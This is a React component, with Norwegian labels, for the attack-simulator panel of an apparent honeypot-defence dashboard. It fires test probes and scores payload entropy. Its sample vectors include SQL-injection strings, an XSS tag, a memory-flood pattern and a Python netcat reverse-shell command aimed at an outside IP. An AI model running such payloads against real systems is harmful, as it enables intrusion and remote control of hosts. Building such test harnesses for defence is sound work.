import React, { useState } from 'react';
import { 
  Play, 
  Layers, 
  Zap, 
  Send, 
  Code2, 
  AlertTriangle, 
  Terminal, 
  RefreshCw, 
  ShieldAlert, 
  Flame 
} from 'lucide-react';
import { AttackVector } from '../types';
import { calculateShannonEntropy } from '../utils/crypto';

interface AttackSimulatorProps {
  simulatorEnabled: boolean;
  onFireAttack: (vectorId: number, customPayload?: string, customIp?: string) => Promise<void>;
  onRunSwarm: () => Promise<void>;
  onRunSequential: () => Promise<void>;
  onRunStress: () => Promise<void>;
  isSimulating: boolean;
}

export const ATTACK_VECTORS: AttackVector[] = [
  {
    id: 1,
    name: 'Basis Avsøkning (Recon Probe)',
    category: 'RECON',
    description: 'Kartlegging av åpne porter og HTTP headers. Ufarlig, men krever oppmerksomhet.',
    payload: { type: 'recon', target: 'ports', probe: 'TCP_SYN_SCAN_8080' },
    defaultCountermeasure: 'Mirror Jamming (Speiler trafikken tilbake)',
    riskLevel: 'LOW',
  },
  {
    id: 2,
    name: 'SQL-Injisering (SQLi Datatyveri)',
    category: 'SQLI',
    description: 'Forsøk på å omgå autentisering og stjele databaserelatert informasjon via manipulerte SQL-kommandoer.',
    payload: { query: 'SELECT * FROM users WHERE admin=1--' },
    defaultCountermeasure: 'Mirror Jamming (Sender syntetiske databasefeil i retur for å villede)',
    riskLevel: 'HIGH',
  },
  {
    id: 3,
    name: 'Skadevare / Kode-eksekvering (RCE)',
    category: 'RCE',
    description: 'Kritisk forsøk på å kjøre vilkårlig shell-kode på vertssystemet for å etablere en reversert shell-kobling.',
    payload: { payload: "import os; os.system('nc -e /bin/sh 185.220.101.5 4444')" },
    defaultCountermeasure: 'Blackout Isolation (Bannlyser IP-en permanent og kutter all kontakt)',
    riskLevel: 'CRITICAL',
  },
  {
    id: 4,
    name: 'Nettleser-skripting (XSS Injisering)',
    category: 'XSS',
    description: 'Innsending av manipulerte skript-tagger for å stjele sesjonsinformasjon fra nettleseren.',
    payload: { script: "<script>alert('WPWW_ELITE_SANDBOX_TEST')</script>" },
    defaultCountermeasure: 'Phantom Loop (Fanger trusselen i en isolert sandboks-tarpit)',
    riskLevel: 'MEDIUM',
  },
  {
    id: 5,
    name: 'Obfuskert Zero-Day Stream',
    category: 'ZERO_DAY',
    description: 'Mørk binær strøm med høy entropi uten kjente signaturer. Test av Shannon Entropi-motoren.',
    payload: { blob: 'x9f8a7b6c5d4e3f2_MUTATED_ZERO_DAY_POLYMORPHIC_BYTE_STREAM_0xFF90_PAYLOAD' },
    defaultCountermeasure: 'Phantom Loop (Oppdaget via Entropi > 5.20 og isolert)',
    riskLevel: 'CRITICAL',
  },
  {
    id: 6,
    name: 'Overbelastningsangrep (DoS Flom)',
    category: 'DOS',
    description: 'Massiv buffer-overflow test med store repeterende mønstre for å utmatte systemminnet.',
    payload: { pattern: 'A'.repeat(1800) },
    defaultCountermeasure: 'Blackout Isolation (Kuttet på grunn av unormalt datavolum)',
    riskLevel: 'HIGH',
  },
];

export const AttackSimulator: React.FC<AttackSimulatorProps> = ({
  simulatorEnabled,
  onFireAttack,
  onRunSwarm,
  onRunSequential,
  onRunStress,
  isSimulating,
}) => {
  const [customPayload, setCustomPayload] = useState<string>("SELECT * FROM credentials WHERE '1'='1'");
  const [customIp, setCustomIp] = useState<string>('192.168.1.189');
  const [lastResponse, setLastResponse] = useState<string | null>(null);

  const customEntropy = calculateShannonEntropy(customPayload);

  const handleCustomFire = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!customPayload.trim()) return;
    await onFireAttack(7, customPayload, customIp);
    setLastResponse(`Egendefinert angrep sendt fra ${customIp}. Forsvaret reagerte umiddelbart!`);
  };

  return (
    <div id="attack-simulator-container" className="space-y-6">
      {/* Simulator Status Banner */}
      {!simulatorEnabled && (
        <div className="p-4 rounded-lg bg-amber-950/40 border border-amber-800/60 text-amber-300 text-xs font-mono flex items-center justify-between">
          <div className="flex items-center gap-2">
            <AlertTriangle className="w-4 h-4 text-amber-400" />
            <span>Angrepssimulatoren er for øyeblikket <strong>DEAKTIVERT (AV)</strong>. Slå den på i toppmenyen for å sende testprober.</span>
          </div>
        </div>
      )}

      {/* Advanced Attack Scenarios */}
      <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 sm:p-5">
        <div className="flex items-center justify-between mb-3">
          <div>
            <h2 className="text-sm font-mono font-bold text-slate-200 uppercase tracking-wider flex items-center gap-2">
              <Layers className="w-4 h-4 text-cyan-400" />
              Avanserte Testscenarioer & Sverm-Orkestrator
            </h2>
            <p className="text-xs text-slate-400 font-mono mt-0.5">
              Simuler realistiske, sammensatte flerleddede angrep for å stressteste den autonome forsvarsmotoren.
            </p>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 pt-2">
          {/* Scenario 1 */}
          <button
            id="btn-scenario-swarm"
            disabled={!simulatorEnabled || isSimulating}
            onClick={onRunSwarm}
            className="p-3.5 rounded-lg bg-slate-900 hover:bg-slate-850 border border-slate-700 hover:border-amber-500/60 text-left transition-all group disabled:opacity-50 disabled:cursor-not-allowed"
          >
            <div className="flex items-center justify-between mb-1.5">
              <span className="text-xs font-mono font-bold text-amber-400 flex items-center gap-1.5">
                <Flame className="w-3.5 h-3.5" /> 1. Attacker Swarm
              </span>
              <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-amber-950 text-amber-300 border border-amber-800">
                5x Prober
              </span>
            </div>
            <p className="text-xs text-slate-300">
              Sender en tilfeldig sverm av prober fra ulike spoofede IP-adresser i rask rekkefølge.
            </p>
          </button>

          {/* Scenario 2 */}
          <button
            id="btn-scenario-sequential"
            disabled={!simulatorEnabled || isSimulating}
            onClick={onRunSequential}
            className="p-3.5 rounded-lg bg-slate-900 hover:bg-slate-850 border border-slate-700 hover:border-cyan-500/60 text-left transition-all group disabled:opacity-50 disabled:cursor-not-allowed"
          >
            <div className="flex items-center justify-between mb-1.5">
              <span className="text-xs font-mono font-bold text-cyan-400 flex items-center gap-1.5">
                <Zap className="w-3.5 h-3.5" /> 2. Sekvensiell Eskalering
              </span>
              <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-cyan-950 text-cyan-300 border border-cyan-800">
                Nivå 1 → 6
              </span>
            </div>
            <p className="text-xs text-slate-300">
              Kjører en streng penetrasjonstest gjennom alle 6 angrepsvektorer i rekkefølge.
            </p>
          </button>

          {/* Scenario 3 */}
          <button
            id="btn-scenario-stress"
            disabled={!simulatorEnabled || isSimulating}
            onClick={onRunStress}
            className="p-3.5 rounded-lg bg-slate-900 hover:bg-slate-850 border border-slate-700 hover:border-purple-500/60 text-left transition-all group disabled:opacity-50 disabled:cursor-not-allowed"
          >
            <div className="flex items-center justify-between mb-1.5">
              <span className="text-xs font-mono font-bold text-purple-400 flex items-center gap-1.5">
                <Terminal className="w-3.5 h-3.5" /> 3. Entropi-Stresstest
              </span>
              <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-purple-950 text-purple-300 border border-purple-800">
                10x Flom
              </span>
            </div>
            <p className="text-xs text-slate-300">
              Genererer og fyrer 10 muterte høy-entropi datastrømmer for å teste Zero-Day deteksjonen.
            </p>
          </button>
        </div>
      </div>

      {/* 6-Tier Attack Matrix */}
      <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 sm:p-5">
        <h2 className="text-sm font-mono font-bold text-slate-200 uppercase tracking-wider mb-3 flex items-center gap-2">
          <Code2 className="w-4 h-4 text-emerald-400" />
          Komplett Angrepsmatrise (6 Standardvektorer)
        </h2>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
          {ATTACK_VECTORS.map((vector) => {
            const riskBadge =
              vector.riskLevel === 'CRITICAL' ? 'bg-rose-950 text-rose-300 border-rose-800' :
              vector.riskLevel === 'HIGH' ? 'bg-amber-950 text-amber-300 border-amber-800' :
              vector.riskLevel === 'MEDIUM' ? 'bg-purple-950 text-purple-300 border-purple-800' :
              'bg-cyan-950 text-cyan-300 border-cyan-800';

            return (
              <div
                key={vector.id}
                id={`vector-card-${vector.id}`}
                className="bg-slate-900/90 border border-slate-800 rounded-lg p-3.5 flex flex-col justify-between hover:border-slate-700 transition-colors"
              >
                <div>
                  <div className="flex items-center justify-between gap-2 mb-2">
                    <span className="text-xs font-mono font-bold text-slate-200 truncate">
                      #{vector.id} {vector.name}
                    </span>
                    <span className={`text-[10px] font-mono px-1.5 py-0.5 rounded border ${riskBadge}`}>
                      {vector.riskLevel}
                    </span>
                  </div>
                  <p className="text-xs text-slate-300 mb-3">
                    {vector.description}
                  </p>

                  <div className="bg-slate-950 rounded p-2 border border-slate-800/80 mb-3">
                    <span className="text-[10px] text-slate-500 font-mono block">Payload testdata:</span>
                    <code className="text-[11px] text-cyan-300 font-mono block truncate">
                      {typeof vector.payload === 'string' ? vector.payload : JSON.stringify(vector.payload)}
                    </code>
                  </div>

                  <div className="text-[11px] font-mono text-slate-400 mb-3">
                    <span className="text-slate-500">Mottiltak:</span> <span className="text-slate-300">{vector.defaultCountermeasure}</span>
                  </div>
                </div>

                <button
                  id={`btn-fire-vector-${vector.id}`}
                  disabled={!simulatorEnabled || isSimulating}
                  onClick={() => onFireAttack(vector.id)}
                  className="w-full py-1.5 px-3 rounded bg-cyan-950 hover:bg-cyan-900/80 text-cyan-300 border border-cyan-800 text-xs font-mono flex items-center justify-center gap-1.5 transition-colors disabled:opacity-50 disabled:cursor-not-allowed group"
                >
                  <Play className="w-3 h-3 text-cyan-400 group-hover:scale-110 transition-transform" />
                  <span>Avfyr Testangrep #{vector.id}</span>
                </button>
              </div>
            );
          })}
        </div>
      </div>

      {/* Custom Payload Injector & Shannon Calculator */}
      <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 sm:p-5">
        <h2 className="text-sm font-mono font-bold text-slate-200 uppercase tracking-wider mb-2 flex items-center gap-2">
          <Terminal className="w-4 h-4 text-purple-400" />
          Egendefinert Payload-Injektor & Entropi-Kalkulator
        </h2>
        <p className="text-xs text-slate-400 font-mono mb-4">
          Skriv inn hvilken som helst egendefinert datastrøm, SQL-spørring eller skadevare-kode. Systemet beregner Shannon-entropi i sanntid og tester det autonome forsvaret.
        </p>

        <form onSubmit={handleCustomFire} className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
            <div className="md:col-span-3">
              <label className="block text-xs font-mono text-slate-400 mb-1">
                Egendefinert Payload / Kode:
              </label>
              <textarea
                id="input-custom-payload"
                rows={3}
                value={customPayload}
                onChange={(e) => setCustomPayload(e.target.value)}
                placeholder="Skriv SQL, RCE shell, XSS eller mutert binærstreng..."
                className="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 font-mono text-xs text-slate-100 placeholder:text-slate-600 focus:outline-none focus:border-purple-500"
              />
            </div>

            <div className="space-y-3">
              <div>
                <label className="block text-xs font-mono text-slate-400 mb-1">
                  Simulert Angriper-IP:
                </label>
                <input
                  id="input-custom-ip"
                  type="text"
                  value={customIp}
                  onChange={(e) => setCustomIp(e.target.value)}
                  className="w-full bg-slate-900 border border-slate-700 rounded-lg p-2 font-mono text-xs text-slate-100 focus:outline-none focus:border-purple-500"
                />
              </div>

              <div className="p-2.5 rounded-lg bg-slate-900 border border-slate-800">
                <div className="text-[11px] font-mono text-slate-400">Beregnet Shannon Entropi:</div>
                <div className="text-lg font-mono font-bold text-purple-400 flex items-center justify-between">
                  <span>{customEntropy.toFixed(2)}</span>
                  <span className={`text-[10px] px-1.5 py-0.5 rounded border ${
                    customEntropy > 5.2 
                      ? 'bg-rose-950 text-rose-300 border-rose-800' 
                      : 'bg-slate-800 text-slate-300 border-slate-700'
                  }`}>
                    {customEntropy > 5.2 ? 'ZERO-DAY DETEKTERT' : 'Standard'}
                  </span>
                </div>
              </div>
            </div>
          </div>

          <div className="flex items-center justify-between pt-2">
            <button
              id="btn-fire-custom-payload"
              type="submit"
              disabled={!simulatorEnabled || isSimulating || !customPayload.trim()}
              className="py-2 px-5 rounded-lg bg-purple-600 hover:bg-purple-500 text-slate-950 font-mono font-bold text-xs flex items-center gap-2 transition-all disabled:opacity-50 disabled:cursor-not-allowed shadow-lg shadow-purple-950"
            >
              <Send className="w-3.5 h-3.5" />
              <span>Avfyr Egendefinert Payload mot Honeypot</span>
            </button>

            {lastResponse && (
              <span className="text-xs font-mono text-emerald-400 truncate max-w-md">
                ✓ {lastResponse}
              </span>
            )}
          </div>
        </form>
      </div>
    </div>
  );
};
